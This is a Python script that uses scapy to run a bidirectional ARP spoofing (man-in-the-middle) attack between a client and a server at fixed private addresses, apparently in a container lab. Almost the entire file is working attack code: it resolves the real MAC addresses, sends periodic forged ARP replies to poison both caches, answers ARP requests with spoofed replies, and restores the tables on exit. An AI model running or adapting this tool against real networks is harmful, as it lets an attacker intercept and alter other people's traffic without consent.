#!/usr/bin/env python3
import scapy.all as scapy
import time
import signal
import sys
import threading
import argparse

# Targets
CLIENT_IP = "172.28.0.11"   # client container
SERVER_IP = "172.28.0.10"   # server container

# Globals to store info used for restore
saved = {
    "iface": None,
    "our_mac": None,
    "client_mac_real": None,
    "server_mac_real": None,
    "stop": False
}

# --------- helper functions ----------
def get_target_mac(ip, iface=None, retries=3, timeout=1):
    """Return the MAC address for the given IP using ARP request (specify iface)."""
    for _ in range(retries):
        arp_request = scapy.ARP(pdst=ip)
        ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        req = ether / arp_request
        answered = scapy.srp(req, timeout=timeout, verbose=False, iface=iface)[0]
        if answered:
            return answered[0][1].hwsrc
    return None

def build_spoof_packet(target_ip, target_mac, spoof_ip, our_mac):
    """Return an Ether/ARP 'is-at' packet telling target_ip that spoof_ip is at our_mac."""
    arp = scapy.ARP(
        op=2,            # is-at (ARP reply)
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,   # claim we are this IP
        hwsrc=our_mac    # our MAC
    )
    ether = scapy.Ether(dst=target_mac, src=our_mac)
    return ether / arp

def send_gratuitous(iface, our_mac, interval=1.0):
    """Periodically send gratuitous (spoof) replies both directions to keep caches poisoned."""
    while not saved["stop"]:
        try:
            client_mac = saved.get("client_mac_real")
            server_mac = saved.get("server_mac_real")
            if client_mac:
                pkt1 = build_spoof_packet(CLIENT_IP, client_mac, SERVER_IP, our_mac)  # tell client: server is at our_mac
                scapy.sendp(pkt1, iface=iface, verbose=False)
            if server_mac:
                pkt2 = build_spoof_packet(SERVER_IP, server_mac, CLIENT_IP, our_mac)  # tell server: client is at our_mac
                scapy.sendp(pkt2, iface=iface, verbose=False)
            # small debug
            print(f"[gratuitous] Told {CLIENT_IP}->{SERVER_IP} and {SERVER_IP}->{CLIENT_IP} are at {our_mac}")
        except Exception as e:
            print(f"[!] Gratuitous send error: {e}")
        time.sleep(interval)

def restore_arp(target_ip, target_mac, source_ip, source_mac, iface=None):
    """Send correct ARP replies to restore the table."""
    pkt = scapy.Ether(dst=target_mac, src=source_mac) / scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    scapy.sendp(pkt, count=5, iface=iface, verbose=False)
    print(f"[+] Restored {target_ip} -> {source_ip} @ {source_mac}")

# --------- reactive handler ----------
def handle_arp(pkt):
    """React to ARP requests: reply unicast to the requester, claiming the requested IP is at our_mac."""
    if not pkt.haslayer(scapy.ARP):
        return
    if pkt[scapy.ARP].op != 1:  # only requests (who-has)
        return

    who_has = pkt[scapy.ARP].pdst
    requester_ip = pkt[scapy.ARP].psrc
    requester_mac = pkt[scapy.ARP].hwsrc
    iface = saved["iface"]
    our_mac = saved["our_mac"]

    # If someone asks for SERVER_IP, reply claiming SERVER_IP is at our_mac
    if who_has == SERVER_IP:
        resp = scapy.Ether(dst=requester_mac, src=our_mac) / scapy.ARP(
            op=2, pdst=requester_ip, hwdst=requester_mac,
            psrc=SERVER_IP, hwsrc=our_mac
        )
        scapy.sendp(resp, iface=iface, verbose=False)
        print(f"[reactive] Replied to {requester_ip} that {SERVER_IP} is at {our_mac}")

    # If someone asks for CLIENT_IP, reply claiming CLIENT_IP is at our_mac
    elif who_has == CLIENT_IP:
        resp = scapy.Ether(dst=requester_mac, src=our_mac) / scapy.ARP(
            op=2, pdst=requester_ip, hwdst=requester_mac,
            psrc=CLIENT_IP, hwsrc=our_mac
        )
        scapy.sendp(resp, iface=iface, verbose=False)
        print(f"[reactive] Replied to {requester_ip} that {CLIENT_IP} is at {our_mac}")

# --------- signal handler ----------
def signal_handler(sig, frame):
    print("\n[!] Caught signal; attempting ARP restore...")
    saved["stop"] = True
    iface = saved.get("iface")
    client_mac = saved.get("client_mac_real")
    server_mac = saved.get("server_mac_real")
    # Try to restore ARP tables
    if client_mac and server_mac:
        try:
            restore_arp(CLIENT_IP, client_mac, SERVER_IP, server_mac, iface=iface)
            restore_arp(SERVER_IP, server_mac, CLIENT_IP, client_mac, iface=iface)
        except Exception as e:
            print(f"[!] Error during restore: {e}")
    else:
        print("[!] Real MACs not available; cannot restore reliably.")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# --------- main ----------
def main():
    parser = argparse.ArgumentParser(description="Reactive + periodic bi-directional ARP spoof")
    parser.add_argument("--iface", default="eth0", help="Interface to use inside container (default: eth0)")
    parser.add_argument("--interval", type=float, default=1.0, help="Interval between gratuitous spoof packets (s)")
    args = parser.parse_args()

    iface = args.iface
    interval = max(0.2, args.interval)
    saved["iface"] = iface

    # Get our MAC for the selected iface
    try:
        our_mac = scapy.get_if_hwaddr(iface)
    except Exception as e:
        print(f"[!] Could not get MAC for iface {iface}: {e}")
        sys.exit(1)
    saved["our_mac"] = our_mac
    print(f"[i] Using iface={iface}, our MAC={our_mac}, gratuitous interval={interval}s")

    # Learn real MACs BEFORE poisoning (for restore)
    client_mac = get_target_mac(CLIENT_IP, iface=iface)
    server_mac = get_target_mac(SERVER_IP, iface=iface)
    if not client_mac or not server_mac:
        print(f"[!] Could not resolve real MAC(s) before poisoning: client={client_mac}, server={server_mac}. Aborting.")
        sys.exit(1)
    saved["client_mac_real"] = client_mac
    saved["server_mac_real"] = server_mac
    print(f"[i] Real client MAC: {client_mac}")
    print(f"[i] Real server MAC: {server_mac}")

    # Start reactive ARP listener (background)
    sniffer_thread = threading.Thread(
        target=lambda: scapy.sniff(iface=iface, filter="arp", prn=handle_arp, store=False)
    )
    sniffer_thread.daemon = True
    sniffer_thread.start()
    print("[i] Reactive ARP listener started")

    # Start periodic gratuitous sender (background)
    grat_thread = threading.Thread(target=send_gratuitous, args=(iface, our_mac, interval))
    grat_thread.daemon = True
    grat_thread.start()
    print("[i] Gratuitous sender started")

    # Keep main thread alive until interrupted
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        signal_handler(None, None)

if __name__ == "__main__":
    main()
